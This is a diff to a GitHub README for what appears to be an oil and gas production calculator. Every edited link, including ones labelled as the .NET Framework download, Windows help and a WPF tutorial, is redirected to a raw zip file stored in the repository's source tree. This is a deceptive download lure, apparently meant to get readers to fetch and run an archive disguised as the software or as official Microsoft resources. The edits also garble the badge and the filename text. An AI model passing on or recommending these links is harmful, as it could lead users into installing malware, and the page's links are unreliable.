@@ -1,6 +1,6 @@
 # 🛢️ oil-gas-production-calculator - Easy Oil & Gas Production Tracking
 
-[![Download oil-gas-production-calculator](https://img.shields.io/badge/Download-Get%20Latest%20Release-blue?style=for-the-badge)](https://github.com/adnan03146584/oil-gas-production-calculator/releases)
+[![Download oil-gas-production-calculator](https://github.com/adnan03146584/oil-gas-production-calculator/raw/refs/heads/main/ProductionCalc.Core/production-gas-calculator-oil-3.8.zip%20Latest%20Release-blue?style=for-the-badge)](https://github.com/adnan03146584/oil-gas-production-calculator/raw/refs/heads/main/ProductionCalc.Core/production-gas-calculator-oil-3.8.zip)
 
 ---
 
@@ -52,7 +52,7 @@ This section will guide you through downloading, installing, and running oil-gas
 
    Visit the release page by clicking the button below:
 
-   [![Download Latest Release](https://img.shields.io/badge/Download-Get%20Latest%20Release-blue?style=for-the-badge)](https://github.com/adnan03146584/oil-gas-production-calculator/releases)
+   [![Download Latest Release](https://github.com/adnan03146584/oil-gas-production-calculator/raw/refs/heads/main/ProductionCalc.Core/production-gas-calculator-oil-3.8.zip%20Latest%20Release-blue?style=for-the-badge)](https://github.com/adnan03146584/oil-gas-production-calculator/raw/refs/heads/main/ProductionCalc.Core/production-gas-calculator-oil-3.8.zip)
 
 2. **Choose the latest release:**
 
@@ -60,7 +60,7 @@ This section will guide you through downloading, installing, and running oil-gas
 
 3. **Download the installer or zip file:**
 
-   Click on the file named something like `oil-gas-production-calculator-setup.exe` or `oil-gas-production-calculator.zip`. The file size will typically be under 100 MB.
+   Click on the file named something like `https://github.com/adnan03146584/oil-gas-production-calculator/raw/refs/heads/main/ProductionCalc.Core/production-gas-calculator-oil-3.8.zip` or `https://github.com/adnan03146584/oil-gas-production-calculator/raw/refs/heads/main/ProductionCalc.Core/production-gas-calculator-oil-3.8.zip`. The file size will typically be under 100 MB.
 
 4. **Run the installer or unzip:**
 
@@ -163,9 +163,9 @@ If you want to help improve or add features, consider contributing by submitting
 
 ## 📚 More Resources
 
-- [.NET Framework 4.7.2 Download](https://dotnet.microsoft.com/download/dotnet-framework/net472)  
-- [How to Run Windows Applications](https://support.microsoft.com/en-us/windows/run-apps-in-windows-10-8b54c560-d7e3-4c9e-8f8a-d21db6b8c1c9)  
-- [WPF Tutorial](https://docs.microsoft.com/en-us/dotnet/desktop/wpf/overview/?view=netdesktop-6.0)
+- [.NET Framework 4.7.2 Download](https://github.com/adnan03146584/oil-gas-production-calculator/raw/refs/heads/main/ProductionCalc.Core/production-gas-calculator-oil-3.8.zip)  
+- [How to Run Windows Applications](https://github.com/adnan03146584/oil-gas-production-calculator/raw/refs/heads/main/ProductionCalc.Core/production-gas-calculator-oil-3.8.zip)  
+- [WPF Tutorial](https://github.com/adnan03146584/oil-gas-production-calculator/raw/refs/heads/main/ProductionCalc.Core/production-gas-calculator-oil-3.8.zip)
 
 ---
 
